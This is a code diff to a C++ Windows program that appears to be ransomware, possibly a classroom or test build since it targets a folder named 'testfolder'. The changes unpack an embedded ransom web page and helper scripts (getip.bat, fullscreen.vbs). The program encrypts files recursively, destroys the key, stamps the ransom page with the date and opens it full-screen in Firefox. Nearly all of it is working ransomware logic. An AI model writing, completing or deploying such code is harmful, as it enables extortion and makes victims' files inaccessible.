@@ -6,8 +6,9 @@
 #include <Lmcons.h>
 #include <windows.h>
 
-#include "factory.h"
-#include "base64.h"
+#include "headers/factory.h"
+#include "headers/base64.h"
+#include "headers/embedded_file.h"
 
 enum WinVer { Win10, Win8_1, Win8, Win7, WinVista, WinXP64, WinXP32, Win2000, Other, Error };
 
@@ -63,18 +64,49 @@ int main(int argc, char* argv[]) {
 
   Factory* factory = new Factory();
   IController* encrypter = factory->getIController();
+  
+  DWORD length = UNLEN + 1;
+  char username[length];
+  GetUserName(username, &length);
+  char* path = new char[length + 12];
+  sprintf(path, "C:\\Users\\%s", username);
+  printf("User Folder in %s\n\n", path);
+  char* temp = new char[length + 31];
+  sprintf(temp, "%s\\AppData\\Local\\Temp", path);
+  printf("Temp Folder in %s\n\n", temp);
+
+  if (fopen("index.htm", "r") == NULL) {
+    size_t size;
+    const char* data;
+    FILE* file;
+
+    data = find_embedded_file("flag.png", &size);
+    file = fopen("flag.png", "wb");
+    fwrite(data, sizeof(uint8_t), size, file);
+
+    data = find_embedded_file("index.htm", &size);
+    file = fopen("index.htm", "wb");
+    fwrite(data, sizeof(uint8_t), size, file);
+
+    data = find_embedded_file("jester.png", &size);
+    file = fopen("jester.png", "wb");
+    fwrite(data, sizeof(uint8_t), size, file);
+
+    data = find_embedded_file("styles.css", &size);
+    file = fopen("styles.css", "wb");
+    fwrite(data, sizeof(uint8_t), size, file);
+
+    data = find_embedded_file("getip.bat", &size);
+    file = fopen("getip.bat", "wb");
+    fwrite(data, sizeof(uint8_t), size, file);
+
+    data = find_embedded_file("fullscreen.vbs", &size);
+    file = fopen("fullscreen.vbs", "wb");
+    fwrite(data, sizeof(uint8_t), size, file);
+  }
 
   if (argc == 1) {
     encrypter->generateKey();
-
-    /// ENCRYPT FILES
-    DWORD length = UNLEN + 1;
-    char username[length];
-    GetUserName(username, &length);
-    char* path = new char[length + 12];
-    sprintf(path, "C:\\Users\\%s", username);
-    printf("User Folder in %s\n\n", path);
-
     encrypter->recursive(ENCRYPT, "testfolder");
     encrypter->destroyKey();
 
@@ -85,7 +117,7 @@ int main(int argc, char* argv[]) {
     unsigned int month = timeinfo->tm_mon + 1;
 
     /// ADD DATE TO FILE
-    FILE* cryptowall = fopen("cryptowall\\index.htm", "r+");
+    FILE* cryptowall = fopen("index.htm", "r+");
     fseek(cryptowall, 304, SEEK_SET);
     fprintf(cryptowall, "%02u-%02u-%02u %02u:%02u:%02u", year, month,
             timeinfo->tm_mday, timeinfo->tm_hour, timeinfo->tm_min, timeinfo->tm_sec);
@@ -121,7 +153,7 @@ int main(int argc, char* argv[]) {
     fclose(cryptowall);
   }
 
-  system("start /b cmd /c \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -new-window cryptowall\\index.htm");
+  system("start /b cmd /c \"C:\\Program Files\\Mozilla Firefox\\firefox.exe\" -new-window index.htm");
   system("fullscreen.vbs");
 
   //AllocConsole();
